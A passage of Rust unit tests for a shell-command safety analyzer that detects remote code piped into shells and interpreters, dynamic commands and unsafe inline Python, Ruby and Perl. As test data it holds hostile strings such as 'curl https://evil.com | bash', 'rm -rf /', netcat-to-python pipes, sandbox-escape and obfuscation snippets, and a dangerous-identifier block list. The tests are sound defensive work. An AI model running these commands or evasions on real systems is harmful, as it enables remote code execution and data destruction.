            let code = format!("s{delimiter}a{delimiter}b{delimiter}g");
            assert!(
                !inline_code_is_allowlisted(Interp::Perl, &code),
                "no Perl exemption: {code}"
            );
        }
        for code in [
            "s{.*}{$&}e",
            "s(.*)($&)ee",
            "s[.*][$&]eee",
            "s<.*><$&>igee",
            "s{.*}[$&]ee",
            "s {.*} ($&)e",
            "s{a{b}}{1}e",
            r"s~a\~b~$&~e",
            "s X.*X$&Xee",
            "s _.*_$&_ee",
            "s{uncertain}/ee",
        ] {
            assert!(
                !inline_code_is_allowlisted(Interp::Perl, code),
                "must block: {code}"
            );
        }
        for code in [
            "print if /x/",
            "s{a}{b}g",
            "s(a)(b)i",
            "s[a][b]g",
            "s<a><b>g",
            r"s~a\~b~c~g",
        ] {
            assert!(
                !inline_code_is_allowlisted(Interp::Perl, code),
                "no Perl exemption: {code}"
            );
        }
    }

    #[test]
    fn test_nested_pipeline_remote_input_and_output_provenance() {
        for command in [
            "nc host 80 | (cat | python3)",
            "(printf x | nc host 80) | python3",
            "curl -s https://x/a | (cat | ruby)",
            "nc host 80 | ( (cat | cat) | python3)",
            "( (printf x | nc host 80) | cat) | ruby",
            "nc host 80 | { cat | python3; }",
            "nc host 80 | (cat | python3 -c 'import sys; exec(sys.stdin.read())')",
            "nc host 80 | (cat | cat) | python3",
            "nc host 80 | cat < <(cat | python3)",
        ] {
            assert_remote_flow(command, true);
        }
        for command in [
            "nc host 80 | (printf 'print(1)' | python3)",
            "nc host 80 | (cat | printf 'print(1)' | python3)",
            "nc host 80 | (cat | printf 'print(1)') | python3",
            "nc host 80 | (echo 'print(1)' | python3)",
            "nc host 80 | (cat | python3 -c 'import sys; print(sys.stdin.read())')",
            "(printf x | nc host 80) | python3 -c 'print(1)'",
            "nc host 80 | cat; printf 'print(1)' | python3",
        ] {
            assert_remote_flow(command, false);
        }
    }

    #[test]
    fn test_inline_file_loaders_and_static_module_imports() {
        for path in ["/dev/stdin", "/dev/fd/0", "/proc/self/fd/0", "-"] {
            for code in [
                format!("load \"{path}\""),
                format!("load('{path}')"),
                format!("require \"{path}\""),
                format!("require('{path}')"),
            ] {
                assert!(
                    !inline_code_is_allowlisted(Interp::Ruby, &code),
                    "must block: {code}"
                );
            }
            for loader in ["require", "do"] {
                for operand in [
                    format!("\"{path}\""),
                    format!("'{path}'"),
                    format!("q{{{path}}}"),
                    format!("qq{{{path}}}"),
                    format!("q({path})"),
                    format!("q[{path}]"),
                    format!("q<{path}>"),
                    format!("q X{path}X"),
                    format!("qq _{path}_"),
                ] {
                    let code = format!("{loader} {operand}");
                    assert!(
                        !inline_code_is_allowlisted(Interp::Perl, &code),
                        "must block: {code}"
                    );
                }
            }
        }
        assert!(!inline_code_is_allowlisted(
            Interp::Ruby,
            "load 'script.rb'"
        ));
        assert!(!inline_code_is_allowlisted(
            Interp::Ruby,
            "require \"json\"; puts JSON.parse(STDIN.read)"
        ));
        assert!(!inline_code_is_allowlisted(
            Interp::Perl,
            "use JSON; print decode_json(<STDIN>);"
        ));
        assert!(!inline_code_is_allowlisted(
            Interp::Perl,
            "require JSON; print <STDIN>;"
        ));
    }

    #[test]
    fn test_spawn_apis_including_underscore_prefixes() {
        for code in [
            "spawn(\"sh\")",
            "os.posix_spawn(\"/bin/sh\", [\"sh\"], {})",
            "os.posix_spawnp(\"sh\", [\"sh\"], {})",
            "_spawn(\"sh\")",
            "_spawnv(0, \"sh\", args)",
            "_spawnve(0, \"sh\", args, env)",
            "_spawnvp(0, \"sh\", args)",
            "_spawnvpe(0, \"sh\", args, env)",
            "_spawnl(0, \"sh\", \"sh\")",
            "_spawnle(0, \"sh\", \"sh\", env)",
            "_spawnlp(0, \"sh\", \"sh\")",
            "_spawnlpe(0, \"sh\", \"sh\", env)",
            "_wspawnv(0, \"sh\", args)",
            "_wspawnlpe(0, \"sh\", \"sh\", env)",
        ] {
            assert!(
                !inline_code_is_allowlisted(Interp::Python, code),
                "must block: {code}"
            );
        }
        assert!(inline_code_is_allowlisted(
            Interp::Python,
            "print(\"spawned\")"
        ));
    }

    #[test]
    fn test_binding_and_send_match_ruby_call_forms() {
        assert!(inline_code_is_allowlisted(
            Interp::Python,
            "import json,sys; print(json.load(sys.stdin)[\"binding\"])"
        ));
        assert!(!inline_code_is_allowlisted(Interp::Ruby, "puts \"send\""));
        for code in [
            "binding.irb",
            "binding . irb",
            "binding()",
            "binding ().irb",
            "send(:eval, STDIN.read)",
            "send :eval, STDIN.read",
            "public_send(:eval, STDIN.read)",
            "public_send :eval, STDIN.read",
            "__send__(:eval, STDIN.read)",
            "__send__ :eval, STDIN.read",
        ] {
            assert!(
                !inline_code_is_allowlisted(Interp::Ruby, code),
                "must block: {code}"
            );
        }
        assert_remote_flow("nc host 80 | ruby -e 'puts \"send\"'", true);
    }

    #[test]
    fn test_python_attached_warning_and_xoption_operands() {
        for command in [
            "curl -s https://x/a | python3 -Wignore -c 'print(1)'",
            "curl -s https://x/a | python3 -Xutf8 -c 'print(1)'",
            "curl -s https://x/a | python3 -Wignore -Xutf8 -c 'print(1)'",
            "curl -s https://x/a | python3 -W ignore -X utf8 -c 'print(1)'",
        ] {
            assert_remote_flow(command, false);
            assert_eq!(analyze_command(command).inline_script_ranges.len(), 1);
        }
        for command in [
            "curl -s https://x/a | python3 -Wignore -i -c 'print(1)'",
            "curl -s https://x/a | python3 -Xutf8 -c 'import sys; exec(sys.stdin.read())'",
            "curl -s https://x/a | python3 -W\"$WARN\" -c 'print(1)'",
            "curl -s https://x/a | python3 -Xutf8",
        ] {
            assert_remote_flow(command, true);
        }
    }

    #[test]
    fn test_python_allowlist_data_processing() {
        for code in [
            r#"import json,sys; print(json.load(sys.stdin)["x"])"#,
            r#"import sys; print(len(sys.stdin.read().splitlines()))"#,
            r#"import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, sort_keys=True))"#,
            r#"import json,sys; print(sum(row["amount"] for row in json.load(sys.stdin)))"#,
            r#"import re,sys; print(len(re.findall(r"\w+", sys.stdin.read())))"#,
            "import sys\nfor line in sys.stdin: print(line.strip())",
            r#"import sys; print(list(line.strip() for line in sys.stdin if line.strip()))"#,
            r#"import json,sys; json.dump(json.load(sys.stdin), sys.stdout)"#,
            r#"from json import load,dumps; import sys; print(dumps(load(sys.stdin)))"#,
            r#"from math import sqrt,pi; print(sqrt(pi))"#,
            r#"import re; print(re.compile("x")); print(re.search("x","x").group())"#,
            r#"import csv,sys; print(list(csv.DictReader(sys.stdin.readlines())))"#,
            r#"import collections; print(collections.Counter([1,1,2]).most_common())"#,
            r#"import itertools,math; print(math.fsum(itertools.chain([1],[2])))"#,
            r#"print(list(map(lambda x: x.strip(), ["a"])))"#,
            r#"import re; print(re.sub("x", lambda x: x.group().upper(), "x"))"#,
            r#"print((x := 1))"#,
            r#"print([1,2,3][:2])"#,
            r#"data = [1,2]; data.append(3); print(data)"#,
            r#"print(True if not False and None is None else False)"#,
            r#"print(b"eval", rb"exec", r"__import__") # getattr is data here"#,
            r#"import sys; sys.stdout.write(str(sys.argv)); sys.exit(0)"#,
        ] {
            assert!(
                inline_code_is_allowlisted(Interp::Python, code),
                "must allow: {code}"
            );
            assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), false);
        }
        assert_remote_flow(
            "curl -s https://x/a | python3 -c \"import sys; print(len(sys.stdin.read().splitlines()))\"",
            false,
        );
    }

    #[test]
    fn test_python_allowlist_adversarial_and_unknown_syntax() {
        for code in [
            r#"getattr(getattr(sys,"modules")["os"],"system")(sys.stdin.read())"#,
            r#"__import__("os").system(sys.stdin.read())"#,
            r#"().__class__.__mro__[1].__subclasses__()"#,
            r#"getattr(sys, "".join(map(chr,[109,111,100,117,108,101,115])))"#,
            r#"import sys; print(sys.modules)"#,
            r#"import os; print(os.name)"#,
            r#"import subprocess; subprocess.run([])"#,
            r#"open("/dev/stdin").read()"#,
            r#"print(f"{eval(sys.stdin.read())}")"#,
            r#"print(f"{1}")"#,
            r#"print(fr"{1}")"#,
            r#"print(\u0065val(sys.stdin.read()))"#,
            r#"print(compile(sys.stdin.read(), "x", "exec"))"#,
            r#"print(type(1))"#,
            r#"print(list(map(lambda x: eval(x), [])))"#,
            r#"print((x := eval(sys.stdin.read())))"#,
            r#"print((unknown := 1))"#,
            r#"print(unknown)"#,
            r#"print(ｅval(1))"#,
            r#"print(1).unknown()"#,
            r#"import json; json.unknown()"#,
            r#"import sys; print(sys.stdin.buffer.read())"#,
            r#"import sys; print(sys.stdin)"#,
            r#"import sys; data = sys.stdin"#,
            r#"import sys; print(list(sys.stdin))"#,
            r#"import sys; print(sys.stdout)"#,
            r#"import json; json.loads("null")()"#,
            r#"data = print; data(1)"#,
            r#"print(getattr)"#,
            r#"from os import system"#,
            r#"from re import compile; compile("x")"#,
            r#"from json import __builtins__"#,
            r#"from math import *"#,
            r#"import json as x"#,
            r#"print(u"x")"#,
            r#"print(t"x")"#,
            r#"print("""x""")"#,
            r#"print("unterminated)"#,
            r#"print("\xGG")"#,
            r#"print("\u00")"#,
            r#"print("\Uffffffff")"#,
            r#"print(b"é")"#,
            " print(1)",
            "print(1)\n print(2)",
            "import sys; for line in sys.stdin: print(line)",
            "print(1",
            "print([1))",
            "print(1) unknown",
            "print(1);;print(2)",
            "print(indent=2,1)",
            "print(end=1,end=2)",
            "print((x+row := 1))",
            "print({1:2,3})",
            "print({1,2:3})",
            "print(x[:::])",
            "print(1 + lambda x: x)",
            "print(1 + not True)",
            "@print",
            "`print(1)`",
            "print(1)\\\n",
            "def x(): print(1)",
            "class x: print(1)",
            "with x: print(1)",
            "try: print(1)",
            "global x",
            "nonlocal x",
            "yield 1",
            "await x",
            "del x",
            "import sys; sys.stdin = 1",
            "print = 1",
            "import math; math.__dict__",
            "import itertools; itertools.unknown()",
            ".é",
            "1 + é",
            "print(1) + é",
        ] {
            assert!(
                !inline_code_is_allowlisted(Interp::Python, code),
                "must block: {code}"
            );
            assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), true);
        }
    }

    #[test]
    fn test_dangerous_identifiers_rejected_in_allowlisted_contexts() {
        let names = [
            "getattr",
            "chr",
            "setattr",
            "delattr",
            "hasattr",
            "vars",
            "globals",
            "locals",
            "dir",
            "type",
            "object",
            "compile",
            "open",
            "input",
            "exec",
            "eval",
            "__import__",
            "breakpoint",
            "help",
            "memoryview",
            "classmethod",
            "staticmethod",
            "super",
            "property",
            "os",
            "subprocess",
            "pickle",
            "marshal",
            "shelve",
            "dill",
            "joblib",
            "runpy",
            "ctypes",
            "pdb",
            "code",
            "builtins",
            "__builtins__",
            "__class__",
            "__mro__",
            "__subclasses__",
            "unknown",
            "execfile",
            "reload",
        ];
        for name in names {
            for code in [
                format!("import sys; print({name})"),
                format!("import sys; {name}(sys.stdin.read())"),
                format!("print(list(map(lambda x: {name}(x), [])))"),
                format!("print((x := {name}(1)))"),
                format!("print(1); {name} = 1"),
                format!("import sys; print(sys.{name})"),
            ] {
                assert!(
                    !inline_code_is_allowlisted(Interp::Python, &code),
                    "must block: {code}"
                );
                assert_remote_flow(&format!("curl -s https://x/a | python3 -c '{code}'"), true);
            }
        }
    }

    #[test]
    fn test_only_python_has_an_inline_allowlist() {
        for kind in [
            Interp::Shell,
            Interp::Ruby,
            Interp::Perl,
            Interp::Node,
            Interp::Php,
        ] {
            for code in ["", "1", "print(1)", "console.log(JSON.parse(input))"] {
                assert!(!inline_code_is_allowlisted(kind, code), "{kind:?}: {code}");
            }
        }
    }

    #[test]
    fn test_python_allowlist_work_is_bounded() {
        let deep = format!("print({}1{})", "(".repeat(100), ")".repeat(100));
        let long = "print(1);".repeat(2000);
        let unary = format!("print({}1)", "-".repeat(100));
        for code in [deep, long, unary] {
            assert!(!inline_code_is_allowlisted(Interp::Python, &code));
        }
    }

    #[test]
    fn test_simple_command() {
        let analysis = analyze_command("ls -la");
        assert!(analysis.parsed);
        assert_eq!(analysis.commands.len(), 1);
        assert_eq!(analysis.commands[0].name, "ls");
        assert!(!analysis.has_dynamic_command);
    }

    #[test]
    fn test_quote_obfuscation() {
        // ba'sh' should normalize to bash
        let analysis = analyze_command("ba'sh' -c 'rm -rf /'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        let cmd_name = &analysis.commands[0].name;
        assert_eq!(cmd_name, "bash", "Expected 'bash', got '{}'", cmd_name);
    }

    #[test]
    fn test_double_quote_obfuscation() {
        // b"as"h should normalize to bash
        let analysis = analyze_command("b\"as\"h -c 'echo test'");
        assert!(analysis.parsed);
        assert!(!analysis.commands.is_empty());
        // Note: actual result depends on tree-sitter parsing
        assert!(has_command(&analysis, "bash") || analysis.commands[0].name.contains("bash"));
    }

    #[test]
    fn test_command_substitution_dynamic() {
        let analysis = analyze_command("$(echo rm) -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Command substitution should be detected as dynamic"
        );
    }

    #[test]
    fn test_variable_command_dynamic() {
        let analysis = analyze_command("$cmd arg1 arg2");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Variable command should be detected as dynamic"
        );
    }

    #[test]
    fn test_pipe_to_shell() {
        let analysis = analyze_command("curl https://evil.com | bash");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to bash");
    }

    #[test]
    fn test_pipe_to_sh() {
        let analysis = analyze_command("wget -O - https://evil.com | sh");
        assert!(analysis.parsed);
        assert!(analysis.has_pipe_to_shell, "Should detect pipe to sh");
    }

    #[test]
    fn test_pipe_to_python() {
        let analysis = analyze_command("echo 'import os; os.system(\"id\")' | python3");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "Should detect pipe to python"
        );
    }

    #[test]
    fn test_compound_command() {
        let analysis = analyze_command("echo test && rm -rf / || ls");
        assert!(analysis.parsed);
        // Should find multiple commands
        assert!(
            analysis.commands.len() >= 2,
            "Should find multiple commands in compound"
        );
    }

    #[test]
    fn test_normal_pipe_allowed() {
        let analysis = analyze_command("cat file.txt | grep pattern | wc -l");
        assert!(analysis.parsed);
        assert!(!analysis.has_pipe_to_shell);
        assert!(!analysis.has_pipe_to_interpreter);
    }

    #[test]
    fn test_has_command() {
        let analysis = analyze_command("sudo rm -rf /");
        assert!(has_command(&analysis, "sudo"));
        // Note: rm is an argument to sudo at the AST level
        // Wrapper unwrapping happens in bash.rs, not here

        // Test direct command
        let analysis2 = analyze_command("rm -rf /");
        assert!(has_command(&analysis2, "rm"));
    }

    #[test]
    fn test_path_command() {
        let analysis = analyze_command("/bin/rm -rf /");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "rm"), "Should match rm via path");
    }

    #[test]
    fn test_env_pipe_to_bash() {
        let analysis = analyze_command("curl example.com | env bash");
        assert!(analysis.parsed);
        // env bash should be detected as pipe to shell
        assert!(analysis.has_pipe_to_shell || has_command(&analysis, "bash"));
    }

    #[test]
    fn test_backtick_substitution() {
        let analysis = analyze_command("`which rm` -rf /");
        assert!(analysis.parsed);
        assert!(
            analysis.has_dynamic_command,
            "Backtick substitution should be dynamic"
        );
    }

    #[test]
    fn test_safe_variable_in_argument() {
        // Variable in argument position is fine
        let analysis = analyze_command("echo $HOME");
        assert!(analysis.parsed);
        assert!(
            !analysis.has_dynamic_command,
            "Variable in argument is not dangerous"
        );
        assert!(has_command(&analysis, "echo"));
    }

    #[test]
    fn test_heredoc() {
        let analysis = analyze_command("cat << EOF\nhello\nEOF");
        assert!(analysis.parsed);
        assert!(has_command(&analysis, "cat"));
    }

    // === NEW TESTS FOR CRITICAL FIXES ===

    #[test]
    fn test_xargs_bash_pipe_detected() {
        // Critical fix: xargs bash should be detected as pipe to shell
        let analysis = analyze_command("echo 'echo pwned' | xargs bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_bash_c_pipe_detected() {
        let analysis = analyze_command("echo 'rm -rf /' | xargs bash -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "xargs bash -c should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_sudo_bash_pipe_detected() {
        let analysis = analyze_command("cat script.sh | sudo bash");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_shell,
            "sudo bash should be detected as pipe to shell"
        );
    }

    #[test]
    fn test_xargs_python_pipe_detected() {
        let analysis = analyze_command("echo 'import os' | xargs python3 -c");
        assert!(analysis.parsed);
        assert!(
            analysis.has_pipe_to_interpreter,
            "xargs python should be detected as pipe to interpreter"
        );
    }
}
